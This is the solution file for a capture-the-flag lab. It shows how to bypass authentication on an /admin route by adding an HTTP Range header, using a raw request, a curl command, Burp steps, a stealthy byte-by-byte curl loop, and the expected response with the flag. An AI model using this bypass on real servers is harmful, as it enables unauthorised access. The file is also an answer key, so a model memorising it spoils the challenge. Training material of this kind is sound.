# SOLUTION — Lab 04 · Range Header Bypass

## Vulnerability

The `/admin` route checks for authentication **only when no `Range` header is present**.  
When a `Range` header is included in the request, the auth check is skipped entirely  
and the server responds with **206 Partial Content**.

## Recon

A plain `GET /admin` returns 403. Nothing in the response hints at the Range trick —  
the student must know the technique or enumerate HTTP headers manually.

## Payload — full content in one request

The admin content is **207 bytes** long.

```
GET /admin HTTP/1.1
Host: localhost:5004
Range: bytes=0-206
```

### With curl

```bash
curl -v -H "Range: bytes=0-206" http://localhost:5004/admin
```

### With Burp Repeater

1. Send `GET /admin HTTP/1.1` → 403
2. Add the header: `Range: bytes=0-206`
3. Send → 206 with the admin panel content and the flag

## Expected response

```
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-206/207
Content-Length: 207

ACCESS GRANTED — INTERNAL ADMIN PANEL
======================================
Server: prod-01.internal
DB host: 10.0.0.42
Secret key: s3cr3t_k3y_d0_n0t_sh4r3

Flag: HackUTT{r4ng3_h34d3r_byt3_by_byt3_3xf1l}
```

## Byte-by-byte variant (stealth)

```bash
for i in $(seq 0 206); do
    curl -s -H "Range: bytes=$i-$i" http://localhost:5004/admin
done
echo
```

## Flag

```
HackUTT{r4ng3_h34d3r_byt3_by_byt3_3xf1l}
```
